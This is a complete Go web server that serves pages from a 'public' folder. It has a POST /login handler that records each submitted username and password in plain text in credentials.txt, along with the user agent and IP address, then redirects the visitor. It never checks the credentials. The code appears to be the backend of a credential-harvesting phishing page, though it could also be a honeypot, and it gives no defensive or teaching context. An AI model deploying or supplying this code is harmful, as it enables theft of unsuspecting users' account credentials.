package main

import (
	"log"
	"log/slog"
	"net/http"
	"os"
	"time"
)

func login(w http.ResponseWriter, r *http.Request) {
	fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}

	defer fh.Close()

	handler := slog.NewTextHandler(fh, nil)

	logger := slog.New(handler)

	logger.Info("login attempt",
		"time", time.Now().String(),
		"username", r.FormValue("_user"),
		"password", r.FormValue("_pass"),
		"user-agent", r.UserAgent(),
		"ip-addr", r.RemoteAddr,
	)

	http.Redirect(w, r, "/", 302)
}

func main() {
	//	fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	//	if err != nil {
	//		panic(err)
	//	}
	//
	//	defer fh.Close()
	//
	//	log.SetOutput(fh)
	//
	mux := http.NewServeMux()

	mux.HandleFunc("POST /login", login)

	fs := http.FileServer(http.Dir("public"))

	mux.Handle("/", fs)
	log.Fatal(http.ListenAndServe(":8080", mux))
}
